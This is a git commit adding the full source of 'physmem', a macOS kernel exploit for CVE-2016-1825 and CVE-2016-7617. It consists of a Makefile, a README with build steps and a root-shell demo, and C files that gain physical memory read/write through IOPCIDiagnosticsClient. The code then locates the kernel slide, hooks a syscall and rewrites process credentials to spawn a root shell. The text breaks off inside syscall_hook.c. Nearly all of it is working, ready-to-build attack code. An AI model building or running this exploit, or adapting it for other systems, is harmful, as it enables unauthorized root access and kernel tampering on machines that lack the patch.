bazad__physmem
commit e0503daad43bc6f2373f91375d2a74ee1a77f5a0
Author:     Brandon Azad <bazad@stanford.edu>
AuthorDate: Sat Dec 24 23:50:00 2016 -0800
Commit:     Brandon Azad <bazad@stanford.edu>
CommitDate: Sat Dec 24 23:50:00 2016 -0800

    physmem
    
    physmem is a physical memory inspection tool and local privilege
    escalation through macOS 10.12.1. It exploits CVE-2016-1825 on OS X
    10.11.4 and below, and CVE-2016-7617 from 10.11.5 up through macOS
    10.12.1.

diff --git a/Makefile b/Makefile
new file mode 100644
index 0000000..bee1571
--- /dev/null
+++ b/Makefile
@@ -0,0 +1,28 @@
+all: physmem
+
+FRAMEWORKS = -framework Foundation -framework IOKit
+
+CFLAGS = -O3 -Wall -Wpedantic -Wno-gnu-folding-constant -Wno-gnu-zero-variadic-macro-arguments -Werror
+
+SOURCES = fail.c \
+	  kernel_image.c \
+	  kernel_slide.c \
+	  main.c \
+	  physmem.c \
+	  privilege_escalation.c \
+	  syscall_hook.c \
+	  syscall_hook.s
+
+HEADERS = fail.h \
+	  kernel_image.h \
+	  kernel_slide.h \
+	  physmem.h \
+	  privilege_escalation.h \
+	  syscall_code.h \
+	  syscall_hook.h
+
+physmem: $(SOURCES) $(HEADERS)
+	$(CC) $(FRAMEWORKS) $(CFLAGS) $(SOURCES) -o $@
+
+clean:
+	rm -f -- physmem
diff --git a/README.md b/README.md
new file mode 100644
index 0000000..ac40639
--- /dev/null
+++ b/README.md
@@ -0,0 +1,62 @@
+## physmem
+
+<!-- Brandon Azad -->
+
+physmem is a physical memory inspection tool and local privilege escalation targeting macOS up
+through 10.12.1. It exploits either [CVE-2016-1825] or [CVE-2016-7617] depending on the deployment
+target. These two vulnerabilities are nearly identical, and exploitation can be done exactly the
+same. They were patched in OS X El Capitan [10.11.5] and macOS Sierra [10.12.2], respectively.
+
+[CVE-2016-1825]: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1825
+[CVE-2016-7617]: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-7617
+[10.11.5]: https://support.apple.com/en-us/HT206567
+[10.12.2]: https://support.apple.com/en-us/HT207423
+
+Because these are logic bugs, exploitation is incredibly reliable. I have not yet experienced a
+panic in the tens of thousands of times I've run a program (correctly) exploiting these
+vulnerabilities.
+
+### CVE-2016-1825
+
+CVE-2016-1825 is an issue in IOHIDevice which allows setting arbitrary IOKit registry properties.
+In particular, the privileged property IOUserClientClass can be controlled by an unprivileged
+process. I have not tested platforms before Yosemite, but the vulnerability appears in the source
+code as early as Mac OS X Leopard.
+
+### CVE-2016-7617
+
+CVE-2016-7617 is an almost identical issue in AppleBroadcomBluetoothHostController. This
+vulnerability appears to have been introduced in OS X El Capitan. It was reported by Ian Beer of
+Google's Project Zero (issue [974]) and Radu Motspan.
+
+[974]: https://bugs.chromium.org/p/project-zero/issues/detail?id=974
+
+### Building
+
+Build physmem by specifying your deployment target on the command line:
+
+    $ make MACOSX_DEPLOYMENT_TARGET=10.10.5
+
+### Running
+
+You can read a word of physical memory using the read command:
+
+    $ ./physmem read 0x1000
+    a69a04f2f59625b3
+
+You can write to physical memory using the write command:
+
+    $ ./physmem write 0x1000 0x1122334455667788
+    $ ./physmem read 0x1000
+    1122334455667788
+
+You can exec a root shell using the root command:
+
+    $ ./physmem root
+    sh-3.2# whoami
+    root
+
+### License
+
+The physmem code is released into the public domain. As a courtesy I ask that if you reference or
+use any of this code you attribute it to me.
diff --git a/fail.c b/fail.c
new file mode 100644
index 0000000..7de1a60
--- /dev/null
+++ b/fail.c
@@ -0,0 +1,28 @@
+/*
+ * fail.c
+ * Brandon Azad
+ *
+ * Error logging and termination.
+ */
+#include "fail.h"
+
+#include "syscall_hook.h"
+
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+void noreturn fail(const char *format, ...) {
+	static bool removing = false;
+	va_list ap;
+	va_start(ap, format);
+	vfprintf(stderr, format, ap);
+	va_end(ap);
+	// Uninstall the syscall hook if this isn't a recursive failure.
+	if (!removing) {
+		removing = true;
+		syscall_hook_remove();
+	}
+	exit(1);
+}
diff --git a/fail.h b/fail.h
new file mode 100644
index 0000000..6d981c2
--- /dev/null
+++ b/fail.h
@@ -0,0 +1,28 @@
+/*
+ * fail.h
+ * Brandon Azad
+ *
+ * Error logging and termination.
+ */
+#ifndef PHYSMEM__FAIL_H_
+#define PHYSMEM__FAIL_H_
+
+#include <stdnoreturn.h>
+
+/*
+ * FAIL
+ *
+ * Description:
+ * 	A macro to print an error message, clean up state, and exit.
+ */
+#define FAIL(fmt, ...)	fail("%s: " fmt "\n", __func__, ##__VA_ARGS__)
+
+/*
+ * fail
+ *
+ * Description:
+ * 	Internal function used by FAIL. Do not call directly.
+ */
+void noreturn fail(const char *format, ...);
+
+#endif
diff --git a/kernel_image.c b/kernel_image.c
new file mode 100644
index 0000000..00a2f70
--- /dev/null
+++ b/kernel_image.c
@@ -0,0 +1,175 @@
+/*
+ * kernel_image.c
+ * Brandon Azad
+ *
+ * Kernel parsing functions.
+ */
+#include "kernel_image.h"
+
+#include "fail.h"
+
+#include <fcntl.h>
+#include <mach-o/loader.h>
+#include <mach-o/nlist.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+#define MIN_MACHO_SIZE  0x1000
+
+/*
+ * kernel_path
+ *
+ * Description:
+ * 	The path to the kernel image.
+ */
+static const char *kernel_path = "/System/Library/Kernels/kernel";
+
+/*
+ * kernel
+ *
+ * Description:
+ * 	The kernel image on disk.
+ */
+static const struct mach_header_64 *kernel;
+
+/*
+ * kernel_size
+ *
+ * Description:
+ * 	The size of the kernel image. This is not currently used, but ideally would be used to make
+ * 	macho_symtab and macho_string_index robust.
+ */
+static size_t kernel_size;
+
+/*
+ * kernel_symtab
+ *
+ * Description:
+ * 	The LC_SYMTAB load command for the kernel.
+ */
+static const struct symtab_command *kernel_symtab;
+
+/*
+ * macho_symtab
+ *
+ * Description:
+ * 	Find the symtab in the Mach-O image.
+ */
+static const struct symtab_command *
+macho_symtab(const struct mach_header_64 *mh, size_t size) {
+	const struct load_command *lc = (const struct load_command *)
+		((uintptr_t)mh + sizeof(*mh));
+
+	while ((uintptr_t)lc < (uintptr_t)mh + mh->sizeofcmds) {
+		if (lc->cmd == LC_SYMTAB) {
+			return (const struct symtab_command *)lc;
+		}
+		lc = (const struct load_command *)((uintptr_t)lc + lc->cmdsize);
+	}
+	return NULL;
+}
+
+/*
+ * macho_string_index
+ *
+ * Description:
+ * 	Find the index of the string in the string table.
+ */
+static uint64_t
+macho_string_index(const struct mach_header_64 *mh, const struct symtab_command *symtab,
+		const char *name) {
+	uintptr_t base = (uintptr_t)mh + symtab->stroff;
+	const char *str = (const char *)(base + 4);
+	const char *end = (const char *)(base + symtab->strsize);
+	uint64_t strx;
+	for (;; str++) {
+		strx = (uintptr_t)str - base;
+		const char *p = name;
+		for (;;) {
+			if (str >= end) {
+				return 0;
+			}
+			if (*p != *str) {
+				while (str < end && *str != 0) {
+					str++;
+				}
+				break;
+			}
+			if (*p == 0) {
+				return strx;
+			}
+			p++;
+			str++;
+		}
+	}
+}
+
+void kernel_init() {
+	int fd = open(kernel_path, O_RDONLY);
+	if (fd == -1) {
+		FAIL("could not open %s", kernel_path);
+	}
+	struct stat st;
+	int err = fstat(fd, &st);
+	if (err == -1) {
+		FAIL("could not stat %s", kernel_path);
+	}
+	if (st.st_size < MIN_MACHO_SIZE) {
+		FAIL("%s too small", kernel_path);
+	}
+	kernel_size = (size_t)st.st_size;
+	kernel = mmap(NULL, kernel_size, PROT_READ, MAP_SHARED, fd, 0);
+	close(fd);
+	if (kernel == MAP_FAILED) {
+		FAIL("mmap %s failed", kernel_path);
+	}
+	if (kernel->magic != MH_MAGIC_64 || kernel->filetype != MH_EXECUTE) {
+		FAIL("%s not a valid kernel", kernel_path);
+	}
+	kernel_symtab = macho_symtab(kernel, kernel_size);
+	if (kernel_symtab == NULL) {
+		FAIL("kernel symtab missing");
+	}
+}
+
+uint64_t kernel_symbol(const char *name) {
+	uint64_t strx = macho_string_index(kernel, kernel_symtab, name);
+	if (strx == 0) {
+		goto notfound;
+	}
+	const struct nlist_64 *nl = (const struct nlist_64 *)
+		((uintptr_t)kernel + kernel_symtab->symoff);
+	for (uint32_t i = 0; i < kernel_symtab->nsyms; i++) {
+		if (nl[i].n_un.n_strx == strx) {
+			if ((nl[i].n_type & N_TYPE) != N_SECT) {
+				goto notfound;
+			}
+			return nl[i].n_value + kernel_slide;
+		}
+	}
+notfound:
+	FAIL("kernel symbol %s not found", name);
+}
+
+uint64_t kernel_search(const void *data, size_t size) {
+	const struct load_command *lc = (const struct load_command *)
+		((uintptr_t)kernel + sizeof(struct mach_header_64));
+	const uintptr_t end = (uintptr_t)kernel + kernel->sizeofcmds;
+	for (; (uintptr_t)lc < end;
+	     lc = (const struct load_command *)((uintptr_t)lc + lc->cmdsize)) {
+		if (lc->cmd != LC_SEGMENT_64) {
+			continue;
+		}
+		const struct segment_command_64 *sc = (const struct segment_command_64 *)lc;
+		const void *base = (const void *)((uintptr_t)kernel + sc->fileoff);
+		const void *found = memmem(base, sc->filesize, data, size);
+		if (found == NULL) {
+			continue;
+		}
+		size_t offset = (uintptr_t)found - (uintptr_t)base;
+		return sc->vmaddr + offset + kernel_slide;
+	}
+	FAIL("data not found in kernel");
+}
diff --git a/kernel_image.h b/kernel_image.h
new file mode 100644
index 0000000..3d20386
--- /dev/null
+++ b/kernel_image.h
@@ -0,0 +1,41 @@
+/*
+ * kernel_image.h
+ * Brandon Azad
+ *
+ * Kernel parsing functions.
+ */
+#ifndef PHYSMEM__KERNEL_IMAGE_H_
+#define PHYSMEM__KERNEL_IMAGE_H_
+
+#include "kernel_slide.h"
+
+#include <stdlib.h>
+
+/*
+ * kernel_init
+ *
+ * Description:
+ * 	Initialize the kernel image.
+ *
+ */
+void kernel_init(void);
+
+/*
+ * kernel_symbol
+ *
+ * Description:
+ * 	Find the address of the given kernel symbol. If kernel_slide is initialized, the address
+ * 	returned will be the in-memory address. Otherwise the unslid address will be returned.
+ */
+uint64_t kernel_symbol(const char *symbol);
+
+/*
+ * kernel_search
+ *
+ * Description:
+ * 	Search for the given byte sequence in the on-disk kernel image, and return the
+ * 	corresponding in-memory address.
+ */
+uint64_t kernel_search(const void *data, size_t size);
+
+#endif
diff --git a/kernel_slide.c b/kernel_slide.c
new file mode 100644
index 0000000..035a7cd
--- /dev/null
+++ b/kernel_slide.c
@@ -0,0 +1,62 @@
+/*
+ * kernel_slide.c
+ * Brandon Azad
+ *
+ * Find the kernel slide using the physmem exploit.
+ *
+ * We use physmem's kernel read primitive to test each possible kernel slide until we find the
+ * right one. Technically, all of the reads before we find the right kernel slide are to arbitrary
+ * locations, and any of them could trigger a panic. However, in my (quite extensive) testing, I've
+ * never once had a panic triggered this way.
+ */
+#include "kernel_slide.h"
+
+#include "fail.h"
+#include "kernel_image.h"
+#include "physmem.h"
+
+#include <errno.h>
+#include <string.h>
+#include <sys/sysctl.h>
+
+uint64_t kernel_slide;
+
+/*
+ * kern_bootsessionuuid
+ *
+ * Description:
+ * 	The name of the sysctl node we use to check that the kernel slide is correct.
+ */
+static const char *kern_bootsessionuuid = "kern.bootsessionuuid";
+
+void probe_kernel_slide() {
+	const uint64_t increment = 0x200000;
+	const uint64_t max_slide = (increment / 2) * 0x400;
+	// Find the address of vm_kernel_slide and bootsessionuuid_string in the base kernel.
+	uint64_t _vm_kernel_slide = kernel_symbol("_vm_kernel_slide");
+	uint64_t _bootsessionuuid_string = kernel_symbol("_bootsessionuuid_string");
+	// Read the memory we will use to check kernel slide correctness.
+	char uuid[37];
+	size_t size = sizeof(uuid);
+	int err = sysctlbyname(kern_bootsessionuuid, uuid, &size, NULL, 0);
+	if (err != 0) {
+		FAIL("sysctlbyname(%s) failed: %s", kern_bootsessionuuid, strerror(errno));
+	}
+	// Try all the different kernel slides.
+	for (kernel_slide = increment; kernel_slide < max_slide; kernel_slide += increment) {
+		uint64_t value = kern_read(_vm_kernel_slide + kernel_slide, sizeof(value));
+		if (value != kernel_slide) {
+			continue;
+		}
+		const unsigned n = sizeof(uuid) / sizeof(uint64_t);
+		uint64_t base = _bootsessionuuid_string + kernel_slide;
+		for (unsigned i = 0; i < n; i++) {
+			value = kern_read(base + i * sizeof(uint64_t), sizeof(value));
+			if (value != ((uint64_t *)uuid)[i]) {
+				continue;
+			}
+		}
+		return;
+	}
+	FAIL("could not find kernel slide");
+}
diff --git a/kernel_slide.h b/kernel_slide.h
new file mode 100644
index 0000000..c46ba72
--- /dev/null
+++ b/kernel_slide.h
@@ -0,0 +1,32 @@
+/*
+ * kernel_slide.h
+ * Brandon Azad
+ *
+ * Find the kernel slide using the physmem exploit.
+ */
+#ifndef PHYSMEM__KERNEL_SLIDE_H_
+#define PHYSMEM__KERNEL_SLIDE_H_
+
+#include <stdint.h>
+
+/*
+ * kernel_slide
+ *
+ * Description:
+ * 	The kASLR slide, or 0 if the slide has not yet been found.
+ */
+extern uint64_t kernel_slide;
+
+/*
+ * probe_kernel_slide
+ *
+ * Description:
+ * 	Find the kernel slide.
+ *
+ * Dependencies:
+ * 	kernel_init
+ * 	physmem_init
+ */
+void probe_kernel_slide(void);
+
+#endif
diff --git a/main.c b/main.c
new file mode 100644
index 0000000..6f07ae5
--- /dev/null
+++ b/main.c
@@ -0,0 +1,147 @@
+/*
+ * main.c
+ * Brandon Azad
+ *
+ * Entry point for physmem, an exploit for CVE-2016-1825 and CVE-2016-7617.
+ */
+
+#include "fail.h"
+#include "kernel_image.h"
+#include "kernel_slide.h"
+#include "physmem.h"
+#include "privilege_escalation.h"
+#include "syscall_hook.h"
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdnoreturn.h>
+#include <string.h>
+#include <unistd.h>
+
+/*
+ * parse_u64
+ *
+ * Description:
+ * 	Parse a string into a uint64_t.
+ */
+static uint64_t parse_u64(const char *str) {
+	char *end;
+	uint64_t value = strtoull(str, &end, 0);
+	if (*str == 0 || *end != 0) {
+		FAIL("invalid integer '%s'", str);
+	}
+	return value;
+}
+
+/*
+ * parse_width
+ *
+ * Description:
+ * 	Parse a string into a width appropriate for phys_read/phys_write.
+ */
+static unsigned parse_width(const char *str) {
+	uint64_t width = parse_u64(str);
+	if (width != 1 && width != 2 && width != 4 && width != 8) {
+		FAIL("invalid width %llu", width);
+	}
+	return (unsigned)width;
+}
+
+/*
+ * usage
+ *
+ * Description:
+ * 	Print usage information and exit.
+ */
+static noreturn void usage() {
+	fprintf(stderr, "usage:\n"
+			"    %1$s read <addr> [<width>]\n"
+			"    %1$s write <addr> <value> [<width>]\n"
+			"    %1$s root [utility [<argument> ...]]\n",
+			getprogname());
+	exit(1);
+}
+
+/*
+ * physmem_read
+ *
+ * Description:
+ * 	Parse the arguments and read from physical memory.
+ */
+static void physmem_read(int argc, const char *argv[]) {
+	if (argc < 1) {
+		usage();
+	}
+	uint64_t paddr = parse_u64(argv[0]);
+	uint64_t value;
+	unsigned width = sizeof(value);
+	if (argc == 2) {
+		width = parse_width(argv[1]);
+	} else if (argc != 1) {
+		usage();
+	}
+	physmem_init();
+	value = phys_read(paddr, width);
+	printf("%0*llx\n", 2 * width, value);
+}
+
+/*
+ * physmem_write
+ *
+ * Description:
+ * 	Parse the arguments and write to physical memory.
+ */
+static void physmem_write(int argc, const char *argv[]) {
+	if (argc < 2) {
+		usage();
+	}
+	uint64_t paddr = parse_u64(argv[0]);
+	uint64_t value = parse_u64(argv[1]);
+	unsigned width = sizeof(value);
+	if (argc == 3) {
+		width = parse_width(argv[2]);
+	} else if (argc != 2) {
+		usage();
+	}
+	physmem_init();
+	phys_write(paddr, value, width);
+}
+
+/*
+ * physmem_root
+ *
+ * Description:
+ * 	Exec the specified program as root. If no program is specified, exec a root shell instead.
+ */
+static void physmem_root(int argc, const char *prog_argv[]) {
+	char *default_argv[] = { "/bin/sh", NULL };
+	char **argv = (char **)prog_argv;
+	if (argc == 0) {
+		argv = default_argv;
+	}
+	kernel_init();
+	physmem_init();
+	probe_kernel_slide();
+	syscall_hook_install();
+	setuid_root();
+	syscall_hook_remove();
+	execve(argv[0], argv, NULL);
+	FAIL("execve failed: %s", strerror(errno));
+}
+
+int main(int argc, const char *argv[]) {
+	if (argc < 2) {
+		usage();
+	}
+	if (strcmp(argv[1], "read") == 0) {
+		physmem_read(argc - 2, argv + 2);
+	} else if (strcmp(argv[1], "write") == 0) {
+		physmem_write(argc - 2, argv + 2);
+	} else if (strcmp(argv[1], "root") == 0) {
+		physmem_root(argc - 2, argv + 2);
+	} else {
+		usage();
+	}
+	return 0;
+}
diff --git a/physmem.c b/physmem.c
new file mode 100644
index 0000000..7d315b8
--- /dev/null
+++ b/physmem.c
@@ -0,0 +1,171 @@
+/*
+ * physmem.c
+ * Brandon Azad
+ *
+ * An exploit for CVE-2016-1825 and CVE-2016-7617 that allows reading and writing arbitrary
+ * physical addresses on macOS.
+ *
+ * The physmem exploit gives us the ability to read arbitrary physical addresses. Fortunately, on
+ * x86-64, kernel virtual addresses within the kernel image can be mapped directly to physical
+ * addresses by masking off the upper 32 bits. This means we can implement kernel word read/write
+ * primitives directly on top of our physical read/write primitives.
+ */
+#include "physmem.h"
+
+#include "fail.h"
+
+#include <CoreFoundation/CoreFoundation.h>
+#include <IOKit/IOKitLib.h>
+
+/* Definitions from IOPCIDevice.h */
+
+enum {
+    kIOPCIConfigSpace           = 0,
+    kIOPCIIOSpace               = 1,
+    kIOPCI32BitMemorySpace      = 2,
+    kIOPCI64BitMemorySpace      = 3
+};
+
+/* Definitions from IOPCIPrivate.h */
+
+enum {
+	kIOPCIDiagnosticsMethodRead  = 0,
+	kIOPCIDiagnosticsMethodWrite = 1,
+	kIOPCIDiagnosticsMethodCount
+};
+
+struct IOPCIDiagnosticsParameters {
+	uint32_t options;
+	uint32_t spaceType;
+	uint32_t bitWidth;
+	uint32_t _resv;
+	uint64_t value;
+	union {
+		uint64_t addr64;
+		struct {
+			unsigned int offset     :16;
+			unsigned int function   :3;
+			unsigned int device     :5;
+			unsigned int bus        :8;
+			unsigned int segment    :16;
+			unsigned int reserved   :16;
+		} pci;
+	} address;
+};
+
+/*
+ * target_service
+ *
+ * Description:
+ * 	The IOKit service that allows setting its IOUserClientClass property.
+ *
+ * Notes:
+ * 	We're assuming that the target macOS version is specified using MACOSX_DEPLOYMENT_TARGET at
+ * 	build time. This variable controls the value of __MAC_OS_X_VERSION_MIN_REQUIRED.
+ */
+#if __MAC_OS_X_VERSION_MIN_REQUIRED <= 101104
+// Patched in 10.11.5: https://support.apple.com/en-us/HT206567
+#define TARGET_SERVICE		"IOHIDevice"
+#elif __MAC_OS_X_VERSION_MIN_REQUIRED <= 101201
+// Patched in 10.12.2: https://support.apple.com/en-us/HT207423
+#define TARGET_SERVICE		"AppleBroadcomBluetoothHostController"
+#else
+#error No known IOKit classes allow setting the IOUserClientClass property for this version of macOS.
+#define TARGET_SERVICE		NULL
+#endif
+static const char *target_service = TARGET_SERVICE;
+
+/*
+ * connection
+ *
+ * Description:
+ * 	A connection to an instance of IOPCIDiagnosticsClient through which we can access physical
+ * 	memory.
+ */
+static io_connect_t connection;
+
+void physmem_init() {
+	// Get a handle to a service that allows setting arbitrary IORegistry properties.
+	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+			IOServiceMatching(target_service));
+	if (service == IO_OBJECT_NULL) {
+		FAIL("could not find any services matching %s", target_service);
+	}
+	// Set the IOUserClientClass property to IOPCIDiagnosticsClient.
+	CFStringRef key = CFStringCreateWithCStringNoCopy(kCFAllocatorDefault,
+			"IOUserClientClass",
+			kCFStringEncodingUTF8,
+			kCFAllocatorNull);
+	CFStringRef value = CFStringCreateWithCStringNoCopy(kCFAllocatorDefault,
+			"IOPCIDiagnosticsClient",
+			kCFStringEncodingUTF8,
+			kCFAllocatorNull);
+	if (key == NULL || value == NULL) {
+		FAIL("string allocation failed");
+	}
+	kern_return_t kr = IORegistryEntrySetCFProperty(service, key, value);
+	CFRelease(key);
+	CFRelease(value);
+	if (kr != KERN_SUCCESS) {
+		FAIL("could not set property: %x", kr);
+	}
+	// Create a connection to the IOPCIDiagnosticsClient.
+	kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
+	IOObjectRelease(service);
+	if (kr != KERN_SUCCESS) {
+		FAIL("could not open connection: %x", kr);
+	}
+}
+
+uint64_t phys_read(uint64_t paddr, unsigned width) {
+	struct IOPCIDiagnosticsParameters param;
+	param.spaceType      = kIOPCI64BitMemorySpace;
+	param.bitWidth       = width * 8;
+	param.options        = 0;
+	param.address.addr64 = paddr;
+	param.value          = -1;
+	size_t size = sizeof(param);
+	kern_return_t kr = IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodRead,
+	                                       NULL,       0,
+	                                       &param,     sizeof(param),
+	                                       NULL,       NULL,
+	                                       &param,     &size);
+	if (kr != KERN_SUCCESS) {
+		FAIL("could not read physical address %p: %x", (void *)paddr, kr);
+	}
+	return param.value;
+}
+
+void phys_write(uint64_t paddr, uint64_t value, unsigned width) {
+	struct IOPCIDiagnosticsParameters param;
+	param.spaceType      = kIOPCI64BitMemorySpace;
+	param.bitWidth       = width * 8;
+	param.options        = 0;
+	param.address.addr64 = paddr;
+	param.value          = value;
+	kern_return_t kr = IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodWrite,
+	                                       NULL,       0,
+	                                       &param,     sizeof(param),
+	                                       NULL,       NULL,
+	                                       NULL,       NULL);
+	if (kr != KERN_SUCCESS) {
+		FAIL("could not write physical address %p: %x", (void *)paddr, kr);
+	}
+}
+
+/*
+ * kernel_virtual_to_physical_mask
+ *
+ * Description:
+ * 	A bit mask to convert kernel virutal addresses within the kernel image to physical
+ * 	addresses.
+ */
+static const uint64_t kernel_virtual_to_physical_mask = 0xffffffff;
+
+uint64_t kern_read(uint64_t kaddr, unsigned width) {
+	return phys_read(kaddr & kernel_virtual_to_physical_mask, width);
+}
+
+void kern_write(uint64_t kaddr, uint64_t value, unsigned width) {
+	phys_write(kaddr & kernel_virtual_to_physical_mask, value, width);
+}
diff --git a/physmem.h b/physmem.h
new file mode 100644
index 0000000..f56701f
--- /dev/null
+++ b/physmem.h
@@ -0,0 +1,55 @@
+/*
+ * physmem.h
+ * Brandon Azad
+ *
+ * An exploit for CVE-2016-1825 and CVE-2016-7617 that allows reading and writing arbitrary
+ * physical addresses on macOS.
+ */
+#ifndef PHYSMEM__PHYSMEM_H_
+#define PHYSMEM__PHYSMEM_H_
+
+#include <stdint.h>
+
+/*
+ * physmem_init
+ *
+ * Description:
+ * 	Establish a connection to the user client we will use for phys_read and phys_write.
+ */
+void physmem_init(void);
+
+/*
+ * phys_read
+ *
+ * Description:
+ * 	Read the width-byte integer at the given physical address.
+ */
+uint64_t phys_read(uint64_t paddr, unsigned width);
+
+/*
+ * phys_write
+ *
+ * Description:
+ * 	Write the value as a width-byte integer to the given physical address.
+ */
+void phys_write(uint64_t paddr, uint64_t value, unsigned width);
+
+/*
+ * kern_read
+ *
+ * Description:
+ * 	Read the width-byte integer at the given kernel address. If the address is not within the
+ * 	kernel image, the result may not be accurate.
+ */
+uint64_t kern_read(uint64_t kaddr, unsigned width);
+
+/*
+ * kern_write
+ *
+ * Description:
+ * 	Write the value as a width-byte integer to the given kernel address. If the address is not
+ * 	within the kernel image, the data may be written to an arbitrary location.
+ */
+void kern_write(uint64_t kaddr, uint64_t value, unsigned width);
+
+#endif
diff --git a/privilege_escalation.c b/privilege_escalation.c
new file mode 100644
index 0000000..be3080e
--- /dev/null
+++ b/privilege_escalation.c
@@ -0,0 +1,102 @@
+/*
+ * privilege_escalation.c
+ * Brandon Azad
+ *
+ * Privilege escalation using the physmem exploit.
+ *
+ * The strategy we use here is designed to be safe and robust. We call the appropriate kernel APIs
+ * to allocate a new ucred struct and then set the saved UID and GID to 0. We then replace our
+ * current ucred with the new one and release references appropriately. This effectively makes our
+ * process setuid 0, and so we can elevate privileges by calling seteuid(0).
+ */
+#include "privilege_escalation.h"
+
+#include "fail.h"
+#include "kernel_image.h"
+#include "syscall_hook.h"
+
+#include <unistd.h>
+
+void setuid_root() {
+	// Check if we're already root. Otherwise we might panic the system.
+	seteuid(0);
+	setuid(0);
+	setgid(0);
+	if (getuid() == 0) {
+		return;
+	}
+	// Resolve the symbols we'll need.
+	uint64_t _current_proc           = kernel_symbol("_current_proc");
+	uint64_t _copyout                = kernel_symbol("_copyout");
+	uint64_t _copyin                 = kernel_symbol("_copyin");
+	uint64_t _IOMalloc               = kernel_symbol("_IOMalloc");
+	uint64_t _IOFree                 = kernel_symbol("_IOFree");
+	uint64_t _kauth_cred_proc_ref    = kernel_symbol("_kauth_cred_proc_ref");
+	uint64_t _kauth_cred_setsvuidgid = kernel_symbol("_kauth_cred_setsvuidgid");
+	uint64_t _kauth_cred_unref       = kernel_symbol("_kauth_cred_unref");
+	// Get a pointer to our proc struct, and copy out the first several words.
+	uint64_t proc = kernel_call(_current_proc, 0, 0, 0, 0, 0);
+	const unsigned max_idx = 128;
+	uint64_t proc_data[max_idx];
+	int err = kernel_call(_copyout, proc, (uint64_t)proc_data, sizeof(proc_data), 0, 0);
+	if (err) {
+		FAIL("copyout failed");
+	}
+	// Add a reference to our credential structure and get its pointer.
+	uint64_t cred = kernel_call(_kauth_cred_proc_ref, proc, 0, 0, 0, 0);
+	// Find out the index of the cred pointer in the proc struct.
+	unsigned cred_idx = 0;
+	for (; cred_idx < max_idx; cred_idx++) {
+		if (proc_data[cred_idx] == cred) {
+			break;
+		}
+	}
+	if (cred_idx == max_idx) {
+		// This means the cred wasn't found in the proc struct. We have no idea where the
+		// cred is, so unfortunately we can't pass a pointer to the cred to
+		// kauth_cred_unref. We have an extra reference on this cred, but this just means
+		// the cred won't be cleaned up when all references are dropped.
+		FAIL("could not find kernel credentials in proc struct");
+	}
+	uint64_t proc_cred_ptr = proc + cred_idx * sizeof(uint64_t);
+	// Set the saved UID and GID on the cred to 0. This consumes the reference added in the
+	// call to kauth_cred_proc_ref and returns a new credential.
+	uint64_t cred0 = kernel_call(_kauth_cred_setsvuidgid, cred, 0, 0, 0, 0);
+	// Allocate a pointer in which we can store our current cred to pass to kauth_cred_unref.
+	uint64_t cred_ptr = kernel_call(_IOMalloc, sizeof(cred), 0, 0, 0, 0);
+	if (cred_ptr == 0) {
+		// kauth_cred_setsvuidgid removed a reference on the old cred, so the only thing we
+		// need to do is free the new cred. However, we can't allocate memory to pass a
+		// pointer to the new cred to kauth_cred_unref. We didn't damage the system, so
+		// just accept the fact that we leaked memory.
+		FAIL("could not allocate kernel memory");
+	}
+	// Store a pointer to our old cred in the memory we just allocated.
+	err = kernel_call(_copyin, (uint64_t)&cred, cred_ptr, sizeof(cred), 0, 0);
+	if (err != 0) {
+		// Just like above, we can't pass the new cred to kauth_cred_unref. However, we can
+		// free the memory we just allocated.
+		kernel_call(_IOFree, cred_ptr, sizeof(cred), 0, 0, 0);
+		FAIL("could not write kernel credential pointer into allocated memory");
+	}
+	// Store the new setuid 0 credentials in our proc.
+	err = kernel_call(_copyin, (uint64_t)&cred0, proc_cred_ptr, sizeof(cred0), 0, 0);
+	if (err != 0) {
+		// We couldn't replace the cred pointer in our proc structure. Ideally we'd free
+		// the new (and useless) cred. However, this would require having a pointer to the
+		// new cred in the kernel to pass to kauth_cred_unref, which would mean another
+		// copyin. Thus, we'll just leak the cred.
+		kernel_call(_IOFree, cred_ptr, sizeof(cred), 0, 0, 0);
+		FAIL("could not set process credentials");
+	}
+	// Free the old cred.
+	kernel_call(_kauth_cred_unref, cred_ptr, 0, 0, 0, 0);
+	kernel_call(_IOFree, cred_ptr, sizeof(cred), 0, 0, 0);
+	// Now we are setuid 0. Elevate to root.
+	seteuid(0);
+	setuid(0);
+	setgid(0);
+	if (getuid() != 0) {
+		FAIL("privilege escalation failed");
+	}
+}
diff --git a/privilege_escalation.h b/privilege_escalation.h
new file mode 100644
index 0000000..0c1ed2b
--- /dev/null
+++ b/privilege_escalation.h
@@ -0,0 +1,24 @@
+/*
+ * privilege_escalation.h
+ * Brandon Azad
+ *
+ * Privilege escalation using the physmem exploit.
+ */
+#ifndef PHYSMEM__PRIVILEGE_ESCALATION_H_
+#define PHYSMEM__PRIVILEGE_ESCALATION_H_
+
+/*
+ * setuid_root
+ *
+ * Description:
+ * 	Set the UID and GID of this process to 0.
+ *
+ * Dependencies:
+ * 	kernel_init
+ * 	physmem_init
+ * 	probe_kernel_slide
+ * 	syscall_hook_install
+ */
+void setuid_root(void);
+
+#endif
diff --git a/syscall_code.h b/syscall_code.h
new file mode 100644
index 0000000..a3ae935
--- /dev/null
+++ b/syscall_code.h
@@ -0,0 +1,12 @@
+/*
+ * syscall_code.h
+ * Brandon Azad
+ *
+ * The syscall code we will hook.
+ */
+#ifndef PHYSMEM__SYSCALL_CODE_H_
+#define PHYSMEM__SYSCALL_CODE_H_
+
+#define SYSCALL_CODE    379
+
+#endif
diff --git a/syscall_hook.c b/syscall_hook.c
new file mode 100644
index 0000000..2b62c32
--- /dev/null
+++ b/syscall_hook.c
@@ -0,0 +1,190 @@
+/*
+ * syscall_hook.c
+ * Brandon Azad
+ *
+ * A system call hook allowing arbitrary kernel functions to be called with up to 5 arguments.
+ *
+ * The physmem exploit makes installing the syscall hook trivial: we don't even need to worry about
+ * memory protections on the kernel TEXT segment because the memory is mapped writable by
+ * IOPCIDiagnosticsClient.
+ */
+#include "syscall_hook.h"
+
+#include "fail.h"
+#include "kernel_image.h"
+#include "physmem.h"
+#include "syscall_code.h"
+
+#include <stddef.h>
+
